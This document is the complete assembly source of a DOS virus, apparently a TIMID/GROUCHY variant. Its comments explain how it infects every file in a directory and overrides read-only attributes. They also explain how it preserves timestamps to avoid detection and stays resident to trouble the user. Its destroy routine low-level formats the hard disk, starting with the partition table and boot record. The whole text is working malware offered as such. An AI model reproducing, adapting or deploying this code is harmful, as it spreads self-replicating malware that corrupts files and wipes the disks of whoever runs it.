;This program is a virus that infects all files, not just executables. It gets
;the first five bytes of its host and stores them elsewhere in the program and
;puts a jump to it at the start, along with the letters "GR", which are used to
;by the virus to identify an already infected program. The virus also save
;target file attributes and restores them on exit, so that date & time stamps
;aren't altered as with ealier TIMID\GROUCHY\T-HEH variants.
;when it runs out of philes to infect, it will do a low-level format of the HDD
;starting with the partition table.

MAIN    SEGMENT BYTE
        ASSUME  CS:MAIN,DS:MAIN,SS:NOTHING

        ORG     100H

;This is a shell of a program which will release the virus into the system.
;All it does is jump to the virus routine, which does its job and returns to
;it, at which point it terminates to DOS.

HOST:
        jmp     NEAR PTR VIRUS_START            ;Note: MASM is too stupid to assemble this correctly
        db      'GR'
        mov     ah,4CH
        mov     al,0
        int     21H             ;terminate normally with DOS

VIRUS:                          ;this is a label for the first byte of the virus

COMFILE DB      '*.*',0       ;search string for any file
DSTRY   DB      0,0,0,2, 0,0,1,2, 0,0,2,2, 0,0,3,2, 0,0,4,2, 0,0,5,2, 0,0,6,2, 0,0,7,2, 0,0,8,2, 0,0,9,2, 0,0,10,2, 0,0,11,2, 0,0,12,2, 0,0,13,2, 0,0,14,2, 0,0,15,2, 0,0,16,2  
FATTR   DB      0
FTIME   DW      0
FDATE   DW      0

VIRUS_START:
        call    GET_START       ;get start address - this is a trick to determine the location of the start of this program
GET_START:                      ;put the address of GET_START on the stack with the call,
        sub     WORD PTR [VIR_START],OFFSET GET_START - OFFSET VIRUS  ;which is overlayed by VIR_START. Subtract offsets to get @VIRUS
        mov     dx,OFFSET DTA   ;put DTA at the end of the virus for now
        mov     ah,1AH          ;set new DTA function
        int     21H
        call    FIND_FILE       ;get a file to attack
        jnz     DESTROY         ;returned nz - go to destroy routine
        call    SAV_ATTRIB
        call    INFECT          ;have a good file to use - infect it
        call    REST_ATTRIB
EXIT_VIRUS:
        mov     dx,80H          ;fix the DTA so that the host program doesn't
        mov     ah,1AH          ;get confused and write over its data with
        int     21H             ;file i/o or something like that!
        mov     bx,[VIR_START]                          ;get the start address of the virus
        mov     ax,WORD PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)]         ;restore the 5 original bytes
        mov     WORD PTR [HOST],ax                                          ;of the COM file to their
        mov     ax,WORD PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)+2]       ;to the start of the file
        mov     WORD PTR [HOST+2],ax
        mov     al,BYTE PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)+4]       ;to the start of the file
        mov     BYTE PTR [HOST+4],al
        mov     [VIR_START],100H                        ;set up stack to do return to host program
        ret                                             ;and return to host

START_CODE:                     ;move first 5 bytes from host program to here
        nop                     ;nop's for the original assembly code
        nop                     ;will work fine
        nop
        nop
        nop

;--------------------------------------------------------------------------
DESTROY:
       mov     AH,05H                  ;format hard disk starting at sector
       mov     DL,80H                  ;0 and continuing through sector 16
       mov     DH,0H                   ;this should wipe out the master boot
       mov     CX,0000H                ;record & partition table


       mov     AL,11H                 ;low-level format information stored
       mov     BX,OFFSET DSTRY        ;at this OFFSET in the syntax 1,2,3,4,
       int     13H                    ;where 1=track number,2=head number,3=sector number
                                      ;and 4=bytes/sector with 2=512 bytes/sector
       ret
;---------------------------------------------------------------------------
;---------------------------------------------------------------------------

       
;-----------------------------------------------------------------------------
;Find a file which passes FILE_OK
;
;This routine does a simple directory search to find a COM file in the
;current directory, to find a file for which FILE_OK returns with C reset.
;
FIND_FILE:
        mov     dx,[VIR_START]
        add     dx,OFFSET COMFILE - OFFSET VIRUS        ;this is zero here, so omit it
        mov     cx,3FH          ;search for any file, no matter what the attributes
        mov     ah,4EH          ;do DOS search first function
        int     21H
FF_LOOP:
        or      al,al           ;is DOS return OK?
        jnz     FF_DONE         ;no - quit with Z reset
        call    FILE_OK         ;return ok - is this a good file to use?
        jz      FF_DONE         ;yes - valid file found - exit with z set
        mov     ah,4FH          ;not a valid file, so
        int     21H             ;do find next function
        jmp     FF_LOOP         ;and go test next file for validity
FF_DONE:
        ret


;--------------------------------------------------------------------------
;Function to determine whether the file specified in FNAME is useable.
;if so return z, else return nz.
;What makes a phile useable?:
;              a) There must be space for the virus without exceeding the
;                 64 KByte file size limit.
;              b) Bytes 0, 3 and 4 of the file are not a near jump op code,
;                 and 'G', 'R', respectively
;
FILE_OK:
        mov     ah,43H                               ;the beginning of this
        mov     al,0                                 ;routine gets the file's
        mov     dx,OFFSET FNAME                      ;attribute and changes it
        int     21H                                  ;to r/w access so that when
        mov     [FATTR],cl                           ;it comes time to open the
        mov     ah,43H                               ;file, the virus can easily
        mov     al,1                                 ;defeat files with a 'read only'
        mov     dx,OFFSET FNAME                      ;attribute. It leaves the file r/w,
        mov     cl,0                                 ;because who checks that, anyway?
        int     21H
        mov     dx,OFFSET FNAME
        mov     al,2
        mov     ax,3D02H                                ;r/w access open file, since we'll want to write to it
        int     21H
        jc      FOK_NZEND                               ;error opening file - quit and say this file can't be used (probably won't happen)
        mov     bx,ax                                   ;put file handle in bx
        push    bx                                      ;and save it on the stack
        mov     cx,5                                    ;next read 5 bytes at the start of the program
        mov     dx,OFFSET START_IMAGE                   ;and store them here
        mov     ah,3FH                                  ;DOS read function
        int     21H

        pop     bx                                      ;restore the file handle
        mov     ah,3EH
        int     21H                                     ;and close the file

        mov     ax,WORD PTR [FSIZE]                     ;get the file size of the host
        add     ax,OFFSET ENDVIRUS - OFFSET VIRUS       ;and add the size of the virus to it
        jc      FOK_NZEND                               ;c set if ax overflows, which will happen if size goes above 64K
        cmp     BYTE PTR [START_IMAGE],0E9H             ;size ok - is first byte a near jump op code?
        jnz     FOK_ZEND                                ;not a near jump, file must be ok, exit with z set
        cmp     WORD PTR [START_IMAGE+3],5247H          ;ok, is 'GR' in positions 3 & 4?
        jnz     FOK_ZEND                                ;no, file can be infected, return with Z set
FOK_NZEND:
        mov     al,1                                    ;we'd better not infect this file
        or      al,al                                   ;so return with z reset
        ret
FOK_ZEND:
        xor     al,al                                   ;ok to infect, return with z set
        ret

;--------------------------------------------------------------------------
SAV_ATTRIB:
        mov     ah,43H
        mov     al,0
        mov     dx,OFFSET FNAME
        int     21H
        mov     [FATTR],cl
        mov     ah,43H
        mov     al,1
        mov     dx, OFFSET FNAME
        mov     cl,0
        int     21H
        mov     dx,OFFSET FNAME
        mov     al,2
        mov     ah,3DH
        int     21H
        mov     [HANDLE],ax
        mov     ah,57H
        xor     al,al
        mov     bx,[HANDLE]
        int     21H
        mov     [FTIME],cx
        mov     [FDATE],dx
        mov     ax,WORD PTR [DTA+28]
        mov     WORD PTR [FSIZE+2],ax
        mov     ax,WORD PTR [DTA+26]
        mov     WORD PTR [FSIZE],ax
        ret
;------------------------------------------------------------------
REST_ATTRIB:
       mov     dx,[FDATE]
       mov     cx, [FTIME]
       mov     ah,57H
       mov     al,1
       mov     bx,[HANDLE]
       int     21H
       mov     ah,3EH
       mov     bx,[HANDLE]
       int     21H
       mov     cl,[FATTR]
       xor     ch,ch
       mov     ah,43H
       mov     al,1
       mov     dx,OFFSET FNAME
       int     21H
       
       mov     ah,31H                   ;terminate/stay resident
       mov     al,0                     ;and set aside 50 16-byte
       mov     dx,0032H                 ;pages in memory, just
       int     21H                      ;to complicate things for the user
                                        ;they might not notice this too quick!
       ret
;---------------------------------------------------------------------------
;This routine moves the virus (this program) to the end of the file
;Basically, it just copies everything here to there, and then goes and
;adjusts the 5 bytes at the start of the program and the five bytes stored
;in memory.
;
INFECT:
        xor     cx,cx                                   ;prepare to write virus on new file; positon file pointer
        mov     dx,cx                                   ;cx:dx pointer = 0
        mov     bx,WORD PTR [HANDLE]
        mov     ax,4202H                                ;locate pointer to end DOS function
        int     21H

        mov     cx,OFFSET FINAL - OFFSET VIRUS          ;now write the virus; cx=number of bytes to write
        mov     dx,[VIR_START]                          ;ds:dx = place in memory to write from
        mov     bx,WORD PTR [HANDLE]                    ;bx = file handle
        mov     ah,40H                                  ;DOS write function
        int     21H

        xor     cx,cx                                   ;now we have to go save the 5 bytes which came from the start of the
        mov     dx,WORD PTR [FSIZE]                     ;so position the file pointer
        add     dx,OFFSET START_CODE - OFFSET VIRUS     ;to where START_CODE is in the new virus
        mov     bx,WORD PTR [HANDLE]
        mov     ax,4200H                                ;and use DOS to position the file pointer
        int     21H

        mov     cx,5                                    ;now go write START_CODE in the file
        mov     bx,WORD PTR [HANDLE]                    ;get file handle
        mov     dx,OFFSET START_IMAGE                   ;during the FILE_OK function above
        mov     ah,40H
        int     21H

        xor     cx,cx                                   ;now go back to the start of host program
        mov     dx,cx                                   ;so we can put the jump to the virus in
        mov     bx,WORD PTR [HANDLE]
        mov     ax,4200H                                ;locate file pointer function
        int     21H

        mov     bx,[VIR_START]                          ;calculate jump location for start of code
        mov     BYTE PTR [START_IMAGE],0E9H             ;first the near jump op code E9
        mov     ax,WORD PTR [FSIZE]                     ;and then the relative address
        add     ax,OFFSET VIRUS_START-OFFSET VIRUS-3    ;these go in the START_IMAGE area
        mov     WORD PTR [START_IMAGE+1],ax
        mov     WORD PTR [START_IMAGE+3],5247H          ;and put 'GR' ID code in

        mov     cx,5                                    ;ok, now go write the 5 bytes we just put in START_IMAGE
        mov     dx,OFFSET START_IMAGE                   ;ds:dx = pointer to START_IMAGE
        mov     bx,WORD PTR [HANDLE]                    ;file handle
        mov     ah,40H                                  ;DOS write function
        int     21H
        
        ret                             ;all done, the virus is transferred

FINAL:                                  ;label for last byte of code to be kept in virus when it moves

ENDVIRUS        EQU     $ + 212         ;label for determining space needed by virus
                                        ;Note: 212 = FFFF - FF2A - 1 = size of data space
                                        ;      $ gives approximate size of code required for virus

        ORG     0FF2AH

DTA             DB      1AH dup (?)             ;this is a work area for the search function
FSIZE           DW      0,0                     ;file size storage area
FNAME           DB      13 dup (?)              ;area for file path
HANDLE          DW      0                       ;file handle
START_IMAGE     DB      0,0,0,0,0               ;an area to store 3 bytes for reading and writing to file
VSTACK          DW      50H dup (?)             ;stack for the virus program
VIR_START       DW      (?)                     ;start address of VIRUS (overlays the stack)


MAIN    ENDS


        END HOST